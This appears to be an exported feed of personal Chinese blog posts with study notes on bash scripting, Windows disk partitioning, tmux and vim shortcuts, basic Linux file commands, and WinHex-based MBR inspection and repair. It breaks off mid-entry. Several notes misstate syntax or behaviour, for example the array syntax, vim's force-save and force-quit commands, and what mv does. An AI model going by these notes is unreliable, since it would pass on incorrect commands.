abc “def” yxc)</li><li>也可以直接定义数组中某个元素的值，如：array[0]=1,array[1]=abc,array[2]=”def”<h3 id="读取数组中某个元素的值"><a href="#读取数组中某个元素的值" class="headerlink" title="读取数组中某个元素的值"></a>读取数组中某个元素的值</h3></li><li>格式:${array[index]}</li><li>echo ${array[0]}<h3 id="读取整个数组"><a href="#读取整个数组" class="headerlink" title="读取整个数组"></a>读取整个数组</h3></li><li>格式：（@和*都是取所有的意思）</li><li>$(array[@])</li><li>$(array[*])<h2 id="expr命令"><a href="#expr命令" class="headerlink" title="expr命令"></a>expr命令</h2></li><li>格式：expr 表达式<br>####说明：</li><li>用空格隔开每一项</li><li>用反斜杠放在shell特定的字符前面，发现表达式运行错误时，可以试试转义</li><li>包含空格和其他特殊字符的字符串要用引号括起来  </li><li>expr会在stdout中输出结果，如果结果为真，stdout为1，否则为0</li><li>expr也有exit code返回值，如果为真，exit code为0，否则为1</li><li>stdout 和 exit code 返回值为互反（真时相反，假时也相反）<h3 id="字符串表达式（以下参数都是在expr后面的）"><a href="#字符串表达式（以下参数都是在expr后面的）" class="headerlink" title="字符串表达式（以下参数都是在expr后面的）"></a>字符串表达式（以下参数都是在expr后面的）</h3></li><li>输出长度：length STRING:返回STRING的长度</li><li>index STRING CHARSET:CHARSET中任意单个字符在STRING中最前面的字符位置，下标从１开始。如果子啊STRING中完全不存在CHARSET中的字符，则返回0</li><li>substr STRING POSITION LENGTH 返回STRING字符串中从POSITON开始，长度最大为LENGTH的子串。如果POSITION或LENGTH为负数，0或非数值，则返回空字符串（下标从1开始）          　        <h3 id="整数表达式"><a href="#整数表达式" class="headerlink" title="整数表达式"></a>整数表达式</h3></li><li>expr支持普通算数操作，算数表达式优先级低于字符串表达式，高于逻辑表达式</li><li><ul><li>— 加减运算，两端参数会转化为整数，如果转化失败则会报错</li></ul></li><li>*  / % 乘除取余运算，两端参数会转化为整数（*在shell中有特殊含义，所以需要转义）</li><li>（）可以表示优先级，但是需要用反斜杠转义<h3 id="逻辑表达式"><a href="#逻辑表达式" class="headerlink" title="逻辑表达式"></a>逻辑表达式</h3></li><li>| 或（c++中是||,少一半）：如果第一个值不是0，则会返回第一个值，第二个值不会计算，如果第一个参数非空并且非0，则会返回第一个参数的值</li><li>&amp; 与 (c++中是&amp;&amp;，少一半)：如果第一个值是0，则不会计算第二个值（短路特性），如果都非空并且非0，则会返回第一个值   </li><li>== 与 = 是同义词，但是还是要按照c++来写逻辑等号==，复制=</li><li>&lt; &lt;= &gt; &gt;= != == = 比较两端的参数，如果为true则返回1，否则返回0，expr首先尝试将两端的参数转换为整数，并做算数比较，如果转换失败，则按字符集排序规则做字符比较（strcmp）</li><li>需要转义的：*、（）、&gt;、&lt;=、|、&amp;</li><li>echo expr a + b加号和数字之间有空格<pre><code>                                                                                                                                                                                                                                                                                                                                                                                                                                                       ### read命令（cin或scanf）</code></pre></li><li>用于从标准输入中读入单行数据，当读到文件结束符时，exit code为1，否则为0</li><li>-p 添加提示信息(类似于input（提示信息）)</li><li>-t 后面跟秒数，定义输入字符的等待时间，超过等待时间后会自动忽略此命令<h3 id="echo命令（相当于cout或printf）"><a href="#echo命令（相当于cout或printf）" class="headerlink" title="echo命令（相当于cout或printf）"></a>echo命令（相当于cout或printf）</h3></li><li>输出格式：echo STRING</li><li>显示普通字符串：echo “Hello acterminal”,引号也可以省略</li><li>显示转义字符：echo “&quot;Hello acterminal&quot;“注意只能使用双引号，单引号不能够转义</li><li>也可以省略最外面表示字符串的双引号：echo &quot;Hello acterminal&quot;</li><li>显示变量：注意一定要用双引号，单引号不能够转义：name=yxc echo “My name is $name”</li><li>显示换行：直接\n无法显示换行转义，开启转义需要-e：例如:echo -e “Hi\n”,即可输出转义</li><li>强行不换行：-e后\c，\c可以取消最后的回车（和py中的end = “”相同），因为echo和py中的print相同，最后会自动换行。</li><li>显示结果到echo “Hello world” &gt; output.txt</li><li> 原样输出字符串，不进行转义或取变量：用单引号引起来</li><li> 显示命令的执行结果：用`引起来<h3 id="printf语句-c-中是以-隔开每一项，而shell中是以space隔开每一项"><a href="#printf语句-c-中是以-隔开每一项，而shell中是以space隔开每一项" class="headerlink" title="printf语句(c++中是以,隔开每一项，而shell中是以space隔开每一项)"></a>printf语句(c++中是以,隔开每一项，而shell中是以space隔开每一项)</h3></li><li>格式：printf format-string [arguments…]</li><li>printf “%d\n” yxc</li><li>shell中printf不自带换行,所以需要自己加上\n(此时无需-e进行转义)<h3 id="文件逻辑运算符"><a href="#文件逻辑运算符" class="headerlink" title="文件逻辑运算符"></a>文件逻辑运算符</h3></li><li>|与&amp;单与和单或是expr中的（必须在expr中使用）</li><li>而||与&amp;&amp;双与和双或是bash中自带的，可以直接在bash中使用</li><li>也带有短路特性</li><li>表达式中的exit code为0表示真，非0表示假</li><li>可以根据短路特性来做if表达式<h3 id="test命令"><a href="#test命令" class="headerlink" title="test命令"></a>test命令</h3></li><li>test命令用于判断文件类型，以及对变量做比较</li><li>test命令用exit code来返回结果，而不是使用stdout，0表示真，非0表示假</li><li>test -e test.sh &amp;&amp; echo “exist” || echo “Not exist”这种情况，如果前面test判断为0（真就会执行逻辑与（虽然是0，但是也是真，这种情况下可以不去看是0还是1，直接根据真假判断））<h4 id="文件类型判断"><a href="#文件类型判断" class="headerlink" title="文件类型判断"></a>文件类型判断</h4></li><li>-e文件是否存在（exist）</li><li>-f是否为文件（file）</li><li>-d是否为目录（directory）<h4 id="文件权限判断"><a href="#文件权限判断" class="headerlink" title="文件权限判断"></a>文件权限判断</h4></li><li>-r文件是否可读</li><li>-w文件是否可写</li><li>-x文件是否可执行</li><li>-s文件是否为非空文件，是则返回0（真），否则返回1（假）<h4 id="整数间的比较"><a href="#整数间的比较" class="headerlink" title="整数间的比较"></a>整数间的比较</h4></li><li>-eq a是否等于b（equal）(为什么不是-e，因为-e是转义，已经被使用过，-e也可以是exist中的是否存在)</li><li>-ne a是否不等于b（not equal）</li><li>-gt a是否大于b（great test）</li><li>-lt a是否小于b（less test）</li><li>-ge a是否大于等于b（great or equal）</li><li>-le a是否小于等于b (less or equal) <h3 id="注意区分expr和test"><a href="#注意区分expr和test" class="headerlink" title="注意区分expr和test"></a>注意区分expr和test</h3></li><li>expr是stdout，1表示真，0表示假（就和if一样，if内部是1即为真）</li><li>test是exit code,0表示真，非0表示假（就和return一样，return 0即为真，return 一个非0的值即为假）<h4 id="字符串比较"><a href="#字符串比较" class="headerlink" title="字符串比较"></a>字符串比较</h4></li><li>-z判断STRING是否为空，如果为空则返回ｔｒｕｅ</li><li>-n判断STRING是否为非空，如果为非空则返回true(-n也可以省略)</li><li>== 判断s1和s2是否相等</li><li>！=判断s1和s2是否不相等</li><li>&gt;和&lt;判断（需要用反斜杠转义），结果等于使用strcmp(逐个字符的ascii码进行比较)<h4 id="多重条件判定"><a href="#多重条件判定" class="headerlink" title="多重条件判定"></a>多重条件判定</h4></li><li>命令格式：test -r filename -a -x filename(由2，3条来链接两个test命令，第二个命令不需要test)</li><li>-a:&amp;&amp;，and</li><li>-o:||,or</li><li>!:例如test ! -x filename:当filename不可执行时，返回true<h4 id="判断符号"><a href="#判断符号" class="headerlink" title="判断符号"></a>判断符号</h4></li><li>【】和test用法几乎一样，更常用于if语句中</li><li>[]内的每一项都要用空格隔开</li><li>中括号内的变量，最好用双引号括起来（为了防止当变量中有空格时&amp;取值出现错误（too many arguments））</li><li>中括号内的常熟，最好用单或双引号括起来<h2 id="判断语句"><a href="#判断语句" class="headerlink" title="判断语句"></a>判断语句</h2></li><li>if then语句，（类似与c++中的if-else语句）if后面跟的是命令，不是值</li><li>if <code>expr 3 \&lt; 3</code>和if 0相同，但是0不是命令，所以无法执行</li><li>需要写if后面跟着命令 if expr 3 &lt; 3</li><li>if then elif then else fi</li><li>case $变量 in 值1）…；；值2）…；；*）…；； esac</li></ol>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>磁盘管理</title>
      <link href="/%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86/"/>
      <url>/%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="磁盘管理使用"><a href="#磁盘管理使用" class="headerlink" title="磁盘管理使用"></a>磁盘管理使用</h1><h2 id="windows自带的磁盘管理"><a href="#windows自带的磁盘管理" class="headerlink" title="windows自带的磁盘管理"></a>windows自带的磁盘管理</h2><h3 id="新建简单卷"><a href="#新建简单卷" class="headerlink" title="新建简单卷"></a>新建简单卷</h3><ol><li>点击需要被分配的磁盘，右键压缩卷，输入压缩量</li><li>单击被分配出的未分配磁盘，右键新建简单卷，设置简单卷的大小（默认为最大）更改磁盘的盘符，选择按下列格式化这个卷，文件系统选NTFS（我只会恢复NTFS类型的数据，FAT版本过多就没学），点击完成<h3 id="合并磁盘"><a href="#合并磁盘" class="headerlink" title="合并磁盘"></a>合并磁盘</h3></li><li>备份后右键删除卷和拓展卷<h2 id="disk-genius"><a href="#disk-genius" class="headerlink" title="disk genius"></a>disk genius</h2></li><li>注意分区前部和后部</li><li>设置分区前部和后部之后可以从后面的展开栏中选择合并到某一个盘中</li></ol>]]></content>
      
      
      <categories>
          
          <category> 分盘 </category>
          
          <category> 磁盘管理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 分盘 </tag>
            
            <tag> 磁盘管理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tmux和vim工具的使用</title>
      <link href="/tmux%E5%92%8Cvim%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>/tmux%E5%92%8Cvim%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="tmux和vim工具的使用"><a href="#tmux和vim工具的使用" class="headerlink" title="tmux和vim工具的使用"></a>tmux和vim工具的使用</h1><h2 id="可以脱离本地环境，直接连服务器即可"><a href="#可以脱离本地环境，直接连服务器即可" class="headerlink" title="可以脱离本地环境，直接连服务器即可"></a>可以脱离本地环境，直接连服务器即可</h2><h3 id="tmux"><a href="#tmux" class="headerlink" title="tmux"></a>tmux</h3><h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><ol><li>分屏</li><li>允许把终端断开之后继续运行（在tmux中写完全不需要担心断网）</li></ol><h4 id="构成"><a href="#构成" class="headerlink" title="构成"></a>构成</h4><ol><li>内部很多个session，每一个session可以开很多Window，每一个Window可以开很多个pane（pane为最小单位，即为shell对话框）</li></ol><h4 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h4><ol><li>直接输入tmux，就会打开一个session，其中包含一个window</li><li>切分：（有前缀键）ctrl加a/b（acterminal为a,没改的为b）后按%为左右分割；上下均分为ctrl加a/b后再双引号</li><li>关闭：选中后CTRL加d，当最后一个pane关闭时会关掉没有pane的window，最后一个window关闭时会关闭当前没有window的session</li><li>选中：鼠标光标选中，或者按前缀键后按方向键</li><li>修改分割线的位置：直接鼠标光标拖动分割线；后者按住前缀键的同时按方向键（前缀键必须按住不动，不松手）</li><li>全屏：选中想全屏的窗口后按下前缀键，后按z，进入全屏和退出全屏同理，</li><li>退出tmux：按下前缀键后按下d（不关闭tmux中的每一个pane，但是关闭tmux），再次打开：tmux+a或tmux+attach</li><li>创建一个window：ctrl加a后松开后按下c</li><li>翻阅：鼠标滚轮；前缀键加pageup或者pagedown</li><li>选中：shift+鼠标选中</li><li>复制：ctrl+insert</li><li>粘贴：shift+insert<h3 id="vim操作"><a href="#vim操作" class="headerlink" title="vim操作"></a>vim操作</h3></li><li>可以在tmux中打开，防止当断网时会丢失数据</li><li>一般命令模式：没有办法编辑，可以输入命令，每一个字母都是一个命令</li><li>编辑模式：在一般命令模式下按下i键，既可以编辑，按下esc键盘即可退出编辑模式(进入编辑模式时底部会有insert提示)</li><li>vim会自动识别代码类型，将会自动显示代码高亮</li><li>命令行模式：在一般命令模式下输入”：/?”(不包括引号)，即可进图命令行模式，命令行在最下面，可以查找，替换，保存，退出，配置编辑器（即配置编辑器的基本配置，例如行号等）等<h4 id="具体操作："><a href="#具体操作：" class="headerlink" title="具体操作："></a>具体操作：</h4></li><li>i进入编辑模式</li><li>esc进入一般命令模式，无论是编辑模式还是命令行模式</li><li>移动光标时不会在行的开头和末尾自动换行，和普通编辑器不同！！！</li><li>移动光标：1：可以直接使用小键盘的方向键盘；2：可以使用hjkl,分别代表左下上右</li><li>n<space> :n为数字，按下数字后按下空格，光标会向右移动n个字符（必须进入一般命令模式下）（到行末会自动换行），此方法为跳到第n个字符的后面！！！(如果想要删除包括第n个字符的话可以输入n-1<space>)</li><li>在一般命令模式下，按下0或home是将光标移动到本行开头，￥或end是移动到本行末尾</li><li>移动到最后一行：shift加g(即为G)</li><li>移动到某一行：用冒号加数字n或数字n加G，即将光标移动到第n行</li><li>跳过多少行：数字加回车</li><li>gg第一行，G最后一行（当访问日志时，可能数据量很大）</li><li>查找是 /word 为查找光标之下的第一个值为word的字符串，？word为查找光标之上的第一个值为word的字符串</li><li>n（小写）会重复上一次的查找操作，N（为反向重复前一次查找操作）</li><li>替换</li><li>&lt;:m,ns/word1/word2/g&gt;:在第m到第n行中查找word1字符串，并且将其替换为word2</li><li>&lt;:1,$s/word1/word2/g&gt;替换全文的word1字串为word2</li><li>&lt;:1,$s/word1/word2/gc&gt;当替换每一个word1时会要求用户确认，输入y或n可以一次替换每一次查找</li><li>&lt;:noh&gt;关闭查找关键词高亮</li><li><v>选中文本，和Windows系统的shift相同</li><li><d>删除选中的文本，和backspace相同，当删除的为某一行时，再次按p可以在鼠标光标的下一行粘贴删除的内容（类似剪切复制）</li><li><dd>删除当前行,和ctrl+d相同</li><li><y>复制选中的文本</li><li><yy>复制当前选中的行</li><li><p>post或者为<ctrl + insert>，当为<y>复制的文本时为在光标的下一个位置粘贴，当为<yy>复制的为一行时(不一定是用yy复制的一行，也可以是用z选中的完整的行)为在下一行粘贴</li><li><u>撤销（dev和pycharm都是CTRL加z）</li><li>&lt;ctrl + r&gt;==&lt;ctrl+shift+z&gt;:取消撤销（dev和pycharm也都是ctrl加y）(r可以理解为repeat,即重复)</li><li>&lt;ctrl+z&gt;挂起当前进程，即保留当前的vim条件下关闭！！！</li><li>&lt;shift+&gt;&gt;选中整体后向右移动，如果不是选中整体时为将当前行向右移动;即&lt;shift + &gt;&gt;为向右缩进一次</li><li>&lt;shift+&lt;&gt;选中后整体向左移动，如果不是选中整体时为将当前行向右移动,即&lt;shift + &lt;&gt;为想左缩进一次</li><li>&lt;:w&gt;保存，只读模式为&lt;:！&gt;来保存</li><li>&lt;:w:&gt;强制保存（有时候未获得超级管理员权限时可以强制保存）</li><li>&lt;:q&gt;退出,quit</li><li>&lt;:q:&gt;强制退出</li><li>&lt;:wq&gt;保存并退出</li><li>&lt;:set nonu&gt;取消行号，当复制时避免连带行号一起复制</li><li>&lt;:set nu&gt;恢复行号</li><li><gg> <d> <G>:删除所有文本（将光标移动到开头，设置为选中模式，再将光标移动到末尾）</li><li><gg> &lt;=&gt; <G>:全文格式化，解决当代码复制的时候出现多重缩进的问题时</li><li>paste模式：带有缩进的模式；&lt;:set paste&gt;为设置为带有自动缩进的模式，但是&lt;:set nopaste&gt;为设置不带有自动缩进的模式(要粘贴的话可以先set paste 后set nopaste)</li><li>&lt;CTRL+q&gt;当vim卡死的时候，取消当前正在执行的命令</li><li>注意区分&lt;shift+insert&gt;和<p>的区别：&lt;shift+insert&gt;可以粘贴vim外面的内容，粘贴的是系统自带的粘贴板;但是<p>只能够粘贴vim内部的内容，粘贴的是vim内部的粘贴板</li><li>&lt;ctrl + insert&gt;会复制行号，但是<p>不会复制行号<h3 id="当用vim编辑文件时，会自动创建一个-filename-swp的临时文件"><a href="#当用vim编辑文件时，会自动创建一个-filename-swp的临时文件" class="headerlink" title="当用vim编辑文件时，会自动创建一个.filename.swp的临时文件"></a>当用vim编辑文件时，会自动创建一个.filename.swp的临时文件</h3></li><li>如果打开某个文件时，如果文件的swp已经存在则会报错</li><li>解决方法：1：找到打开文件的程序并退出，2：直接删除该swp文件即可<h1 id="操作整理"><a href="#操作整理" class="headerlink" title="操作整理"></a>操作整理</h1><h2 id="很重要的翻页操作（当自己没有鼠标时非常实用）"><a href="#很重要的翻页操作（当自己没有鼠标时非常实用）" class="headerlink" title="很重要的翻页操作（当自己没有鼠标时非常实用）"></a>很重要的翻页操作（当自己没有鼠标时非常实用）</h2></li><li>在terminal中&lt;shift+pageup&gt;/&lt;shift+pagedown&gt;实现翻页（记住terminal中用shift）</li><li>在vim中用前缀键加<pageup>/<pagedown>来实现(记住vim中用前缀键) <h2 id="使用的最大化pane窗口操作"><a href="#使用的最大化pane窗口操作" class="headerlink" title="使用的最大化pane窗口操作"></a>使用的最大化pane窗口操作</h2></li><li>&lt;ctrl + z&gt;,最大化与退出最大化同样操作（z可以理解为最）<h2 id="关闭操作："><a href="#关闭操作：" class="headerlink" title="关闭操作："></a>关闭操作：</h2></li><li>vim的关闭为&lt;:wq&gt;(保存并退出)&lt;:q&gt;（直接退出）（详细上面有直接操作）</li><li>pane的关闭：&lt;ctrl + a + x&gt;(前缀键加x)</li><li>window的关闭&lt;ctrl + b + &amp;&gt;(前缀键加&amp;)</li><li>以上两条一般会提示是否关闭，y/n</li></ol>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> tmux </category>
          
          <category> vim </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> tmux </tag>
            
            <tag> vim </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常用文件管理命令</title>
      <link href="/%E5%B8%B8%E7%94%A8%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E5%91%BD%E4%BB%A4md/"/>
      <url>/%E5%B8%B8%E7%94%A8%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E5%91%BD%E4%BB%A4md/</url>
      
        <content type="html"><![CDATA[<h1 id="常用文件文件名"><a href="#常用文件文件名" class="headerlink" title="常用文件文件名"></a>常用文件文件名</h1><h2 id=""><a href="#" class="headerlink" title="/"></a>/</h2><ol><li>根目录<h2 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h2></li><li> 用于存放可执行文件命令</li></ol><h2 id="ect"><a href="#ect" class="headerlink" title="ect"></a>ect</h2><ol><li>配置文件，类似于config文件</li><li>内部常常有nginx文件夹，存放应用的各种配置<h2 id="var"><a href="#var" class="headerlink" title="var"></a>var</h2></li><li>log文件夹中存放各种日志</li></ol><h2 id="lib"><a href="#lib" class="headerlink" title="lib"></a>lib</h2><ol><li>用于存放安装包，类似于py的模块和c的头文件</li></ol><h2 id="home"><a href="#home" class="headerlink" title="home"></a>home</h2><ol><li>所有用户的家目录</li></ol><h2 id="proc"><a href="#proc" class="headerlink" title="proc"></a>proc</h2><ol><li>存放配置文件</li><li>例如Linux系统下存放cpu信息的cpuinfo，win系统可以直接通过我的电脑中的属性来查看</li></ol><p>##注意区分家目录和根目录</p><ol><li>家目录是根目录的一个分支，一个家目录下可以有多个用户分支</li></ol><p><img src="https://img-blog.csdnimg.cn/20200224172609484.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0N1aXlhbmJpbmcx,size_16,color_FFFFFF,t_70"></p><h1 id="路径概念"><a href="#路径概念" class="headerlink" title="路径概念"></a>路径概念</h1><h2 id="路径描述："><a href="#路径描述：" class="headerlink" title="路径描述："></a>路径描述：</h2><ol><li>绝对路径：从根目录开始描述（文件后面要带斜杠，不是文件名的开头）pwd为绝对路劲</li><li>相对路径：从当前路径开始描述路径</li><li>二者之间的区别：开头是斜杠是绝对路径，不是斜杠就一定是相对路径<h2 id="操作："><a href="#操作：" class="headerlink" title="操作："></a>操作：</h2></li><li>一个点表示当前目录，两个点表示上级目录，即”../“,而”./“表示当前目录</li><li>例子：../temp/./temp/main.cpp:意为返回temp的上级目录后切回temp，后保留在temp，后在temp中找到main.cpp文件</li><li>~/波浪号加斜杠表示返回家目录<h1 id="常用文件管理指令"><a href="#常用文件管理指令" class="headerlink" title="常用文件管理指令"></a>常用文件管理指令</h1><h2 id="ctrl-c"><a href="#ctrl-c" class="headerlink" title="ctrl+c"></a>ctrl+c</h2></li><li>终止杀掉当前进程，传入终止信号，可以直接跟在一个指令后面，2. 此指令可以直接终止，换行并清空<h2 id="CTRL-U"><a href="#CTRL-U" class="headerlink" title="CTRL+U"></a>CTRL+U</h2></li><li>可以直接清空本行，终端中直接显示</li></ol><h2 id="tab键"><a href="#tab键" class="headerlink" title="tab键"></a>tab键</h2><ol><li>补全指令或路径（可以写两个字母就试一个tab）</li><li>条件：系统发现如果有多种选项选择则不会执行，单个选项则执行</li></ol><h2 id="方向键"><a href="#方向键" class="headerlink" title="方向键"></a>方向键</h2><ol><li>上可以直接还原上一条命令</li></ol><h2 id="ls命令"><a href="#ls命令" class="headerlink" title="ls命令"></a>ls命令</h2><ol><li>展示当前列表（ls可以理解为list）</li><li>ls -l：表示展示当前文件的详细信息</li><li>ls -lh:人性化去输出，即可以不同内存单元大小互相切换</li><li>ls -a:显示所有文件，所有以”.”开头的文件即为隐藏文件？（all）</li><li>ls -A:不显示当前文件的目录，显示其下属的文件的隐藏文件？</li><li>ll:ls -la的简写<h2 id="pwd命令"><a href="#pwd命令" class="headerlink" title="pwd命令"></a>pwd命令</h2></li><li>显示当前绝对路径<h2 id="cd命令"><a href="#cd命令" class="headerlink" title="cd命令"></a>cd命令</h2></li><li>changediractory的简写，意思为切换路径</li><li>后面既可以是相对路径，也可以是绝对路径</li><li>cd -:意思为返回上一个，注意，只能是返回上一级，不是多级<h2 id="cp："><a href="#cp：" class="headerlink" title="cp："></a>cp：</h2></li><li>复制加粘贴加重命名命令</li><li>格式：cp p1 p2，注意空格位置<h2 id="mkdir："><a href="#mkdir：" class="headerlink" title="mkdir："></a>mkdir：</h2></li><li>既可以根据相对路径创建，也可以根据绝对路径来创建</li><li>创建a里有b，b里有c的：mkdir a/b/c</li><li>如果存在则跳过不报错，没有则生成</li><li>创建多级文件夹需要加上-p，否则报错</li></ol><h2 id="rm命令"><a href="#rm命令" class="headerlink" title="rm命令"></a>rm命令</h2><ol><li>rm 待删除 -r：递归方式删除</li><li>注意，rm 待删除 -f为强制删除，无论其是否是保护文件，不要轻易使用，可能回产生无法挽回的局面</li><li>rm a/<em>:加上</em>意为删除所有文件，该句意为删除a文件夹下所有文件</li><li>rm a -r 删除文件夹rm a 删除文件rm *.txt,删除当前文件夹下的所有.txt类型的文件，如果加*但是不加文件类型后缀则为删除当前文件夹下所有文件<h2 id="touch创建文件"><a href="#touch创建文件" class="headerlink" title="touch创建文件"></a>touch创建文件</h2></li><li>注意区分mkdir和touch，mkdir是创建文件夹而touch为创建文件</li><li>创建文件时要加上文件类型，例如.txt,.png等<h2 id="mv命令："><a href="#mv命令：" class="headerlink" title="mv命令："></a>mv命令：</h2></li><li>mv p1 p2:将p1中的内容移入p2中</li><li>mv a/tmp.txt b/:将a中的tmp移动至b中，find a结果将只有a，find b的结果将有b，b/tmp.txt(b下有tmp.txt文件)</li><li>注意区分cp和mv，cp是将A复制给B，而mv是将A移动至B</li><li>mv tmp.txt tmp.cpp,可以将tmp.txt中的内容复制到tmp.txt中<h2 id="cat命令："><a href="#cat命令：" class="headerlink" title="cat命令："></a>cat命令：</h2></li><li>看文件中写的内容<h2 id="对文件操作要加-r"><a href="#对文件操作要加-r" class="headerlink" title="对文件操作要加-r"></a>对文件操作要加-r</h2></li><li>例如：rm -r dir_a dir_b dir_c,为删除文件夹dir_a dir_b dir_c三个文件夹</li></ol>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>winhex</title>
      <link href="/winhex/"/>
      <url>/winhex/</url>
      
        <content type="html"><![CDATA[<h1 id="文件系统："><a href="#文件系统：" class="headerlink" title="文件系统："></a>文件系统：</h1><pre><code>NTFS存储较有逻辑性</code></pre><h2 id="分配内存大小"><a href="#分配内存大小" class="headerlink" title="分配内存大小"></a>分配内存大小</h2><h2 id="创建虚拟磁盘："><a href="#创建虚拟磁盘：" class="headerlink" title="创建虚拟磁盘："></a>创建虚拟磁盘：</h2><pre><code>１：右键此电脑２：管理３：右键磁盘管理，点击创建ＶＨＤ４：右键新创建的磁盘，初始化１选择MBR（不是GPT）5：新建简单卷（简单卷大小不用管，NTFS可以选FAT３２）</code></pre><h2 id="底层数据MBR："><a href="#底层数据MBR：" class="headerlink" title="底层数据MBR："></a>底层数据MBR：</h2><p>——————————————————————————</p><h3 id="第二个是启动某一个文件功能，打开后可以查看到底层数据"><a href="#第二个是启动某一个文件功能，打开后可以查看到底层数据" class="headerlink" title="第二个是启动某一个文件功能，打开后可以查看到底层数据"></a>第二个是启动某一个文件功能，打开后可以查看到底层数据</h3><p>——————————————————————————<br>##</p><ol><li>查找中含有区分大小写，按照ASCII码（美国信息交换标准代码）和UNICODE两种编码，因为大多数是美国微软公司，所以可以</li><li>选择ASCII；查找中按f3即可启动查找，当找到一个目标值的时候即会暂停，再次点击f3即可再次启动搜索 <h2 id="注意区分搜索文本和搜索十六进制数值"><a href="#注意区分搜索文本和搜索十六进制数值" class="headerlink" title="注意区分搜索文本和搜索十六进制数值"></a>注意区分搜索文本和搜索十六进制数值</h2></li><li>Find hex values:<br> 可以搜索底层数据中十六进制的某一个数值（记住，十六进制每一位数都是偶数位，不会出现奇数的情况）</li><li>扇区：<h2 id="每512个字节是一个扇区，"><a href="#每512个字节是一个扇区，" class="headerlink" title="每512个字节是一个扇区，"></a>每512个字节是一个扇区，</h2></li><li>——————————————————————————————————————<h2 id="查找时可以选择偏移变量："><a href="#查找时可以选择偏移变量：" class="headerlink" title="查找时可以选择偏移变量："></a>查找时可以选择偏移变量：</h2></li><li>即到那个字节，从哪个字节，可以提高搜索速度，缩短搜索时间</li><li>跳转功能： </li><li>点击左边可以十进制和十六进制互相转换： </li><li>也可以使用导航——》跳至——》选择文本开始或末尾</li><li>看最上面的一栏即可判断是十进制还是十六进制： </li><li>跳转到某一个扇区功能： ，单位如果是sector则为以分区为单位</li><li>返回上一步或下一步操作：</li></ol><p>———————————————————————————————————————</p><h2 id="Datainterpreter-数据解释器，视图（V）——-gt-显示（Show）——数据解释器"><a href="#Datainterpreter-数据解释器，视图（V）——-gt-显示（Show）——数据解释器" class="headerlink" title="Datainterpreter:数据解释器，视图（V）——&gt;显示（Show）——数据解释器"></a>Datainterpreter:数据解释器，视图（V）——&gt;显示（Show）——数据解释器</h2><h2 id="另：winhex自带计算器caculator"><a href="#另：winhex自带计算器caculator" class="headerlink" title="另：winhex自带计算器caculator;"></a>另：winhex自带计算器caculator;</h2><h2 id="注意，这里的粘贴时ctrl-B-不是ctrl-V"><a href="#注意，这里的粘贴时ctrl-B-不是ctrl-V" class="headerlink" title="注意，这里的粘贴时ctrl+B!!!!!!!!!!!!!!!!!不是ctrl+V"></a>注意，这里的粘贴时ctrl+B!!!!!!!!!!!!!!!!!不是ctrl+V</h2><pre><code>1. 意思和写入相同</code></pre><h2 id="MBR：计算机开机访问硬盘时所必须要读取的首个扇区（0柱面，0磁头，1扇区）"><a href="#MBR：计算机开机访问硬盘时所必须要读取的首个扇区（0柱面，0磁头，1扇区）" class="headerlink" title="MBR：计算机开机访问硬盘时所必须要读取的首个扇区（0柱面，0磁头，1扇区）"></a>MBR：计算机开机访问硬盘时所必须要读取的首个扇区（0柱面，0磁头，1扇区）</h2><pre><code>2. 硬盘是由多个盘片组成的，每个盘片是由多个扇区组成的，每个盘片上由多个磁道（同心圆</code></pre><h2 id="MBR扇区分为"><a href="#MBR扇区分为" class="headerlink" title="MBR扇区分为"></a>MBR扇区分为</h2><ol><li>引导程序，计算机启动后读取，如果磁盘数据不对的话会死机，如果非虚拟磁盘的MBR清除的话会死机</li><li>磁盘签名：系统在对硬盘初始化时写入的标签，系统依靠标签来识别磁盘（如果磁盘签名丢失会认为硬盘未初始化）</li><li>分区表：管理硬盘的分区，如果被破坏则分区会丢失</li><li>55AA：结束标志，执行MBR引导程序时，如果最后是55AA才会继续读取下一个分区</li><li>从后往前看，最后两个字节为结束标志，再往前走64个字节是分区表（往前走三行），再往前走两个是磁盘签名。再往前是引导程序</li></ol><h1 id="字节偏移："><a href="#字节偏移：" class="headerlink" title="字节偏移："></a>字节偏移：</h1><pre><code>十六进制表示，0x后面两位是横向表示，后面的是纵向表示</code></pre><p>0x01BE：01B是横向，E是纵向</p><h1 id="修复MBR："><a href="#修复MBR：" class="headerlink" title="修复MBR："></a>修复MBR：</h1><pre><code>正常的磁盘都是初始化的，如果不小心按了初始化则相当于格式化了磁盘，MBR全部清0，</code></pre><h2 id="分区总大小-–-分区的起始分区好-分区的大小"><a href="#分区总大小-–-分区的起始分区好-分区的大小" class="headerlink" title="分区总大小 – 分区的起始分区好==分区的大小"></a>分区总大小 – 分区的起始分区好==分区的大小</h2><h2 id="修复中最重要的是修复文件系统类型，分区扇区号和分区总大小，注意最后的55AA"><a href="#修复中最重要的是修复文件系统类型，分区扇区号和分区总大小，注意最后的55AA" class="headerlink" title="修复中最重要的是修复文件系统类型，分区扇区号和分区总大小，注意最后的55AA"></a>修复中最重要的是修复文件系统类型，分区扇区号和分区总大小，注意最后的55AA</h2><h2 id="最后两位是55AA，固定的"><a href="#最后两位是55AA，固定的" class="headerlink" 